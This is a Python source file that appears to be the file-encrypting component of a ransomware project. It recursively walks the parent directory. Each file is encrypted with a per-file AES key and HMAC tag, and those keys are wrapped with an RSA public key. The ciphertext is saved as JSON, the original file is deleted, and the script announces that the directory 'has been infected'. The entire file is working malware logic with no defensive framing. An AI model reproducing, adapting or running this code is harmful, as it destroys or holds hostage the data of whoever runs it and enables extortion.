from base64 import b64encode, b64decode
from threading import Thread
import encryption, constants, os, json, cryptools, time, sys, colorama


'''

Encrypts everything in the directory
where this program is executed

'''

progressbar = True

repeat = True

def main():

	global justPrinted

	global repeat

	animation = Thread(target=cinematics)

	printheader()

	animation.start()

	folder_path = '..'

	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)


	for current_directory, sub_directories, sub_files in os.walk(folder_path):

		if 'ransomware' in current_directory.lower():
			continue

		for file in sub_files:

			fileName = ''.join(file.split('.')[:-1])

			ext = file.split('.')[-1]


			if len(file.split('.')) == 0 or file.endswith('json'):
				continue

			json_dict = dict()



			aes_key = os.urandom(constants.AES_KEY_LENGTH)

			aes_iv = os.urandom(constants.IV_LENGTH)

			aes_cipher = encryption.SymmetricCipher(aes_key, aes_iv)

			hmac_key = os.urandom(constants.HMAC_KEY_LENGTH)

			with open(os.path.join(current_directory, file), 'rb') as f:
				ciphertext = aes_cipher.Encrypt(f.read())

			tag = cryptools.HMAC(ciphertext, hmac_key)

			encrypted_keys = rsa_cipher.Encrypt(aes_key + hmac_key)


			json_dict['IV'] = b64encode(aes_iv)
			json_dict['KEY'] = b64encode(encrypted_keys)
			json_dict['TAG'] = b64encode(tag)
			json_dict['EXT'] = b64encode(ext)
			json_dict['CIPHER'] = b64encode(ciphertext)

			with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
				json.dump(json_dict, json_file)

			os.remove(os.path.join(current_directory, file))

	repeat = False

def cinematics():
	while repeat:
		if progressbar:
			sys.stdout.write(colorama.Fore.RED + '\b/')
			sys.stdout.flush()
			time.sleep(0.1)
			sys.stdout.write(colorama.Fore.RED + '\b-')
			sys.stdout.flush()
			time.sleep(0.1)
			sys.stdout.write(colorama.Fore.RED + '\b\\')
			sys.stdout.flush()
			time.sleep(0.1)
	os.chdir('..')
	sys.stdout.write('\b \n\n' + colorama.Style.RESET_ALL + 'Directory has been ' + colorama.Fore.RED + 'infected' + colorama.Style.RESET_ALL + '\n\n')
	sys.stdout.write(colorama.Style.RESET_ALL)

def printheader():
	os.chdir('..')
	sys.stdout.write('\nInfecting Directory: ' + colorama.Fore.GREEN + os.getcwd() + '...  ')
	sys.stdout.flush()
	sys.stdout.write(colorama.Style.RESET_ALL)
	os.chdir('ransomware')

if __name__ == '__main__':
	main()
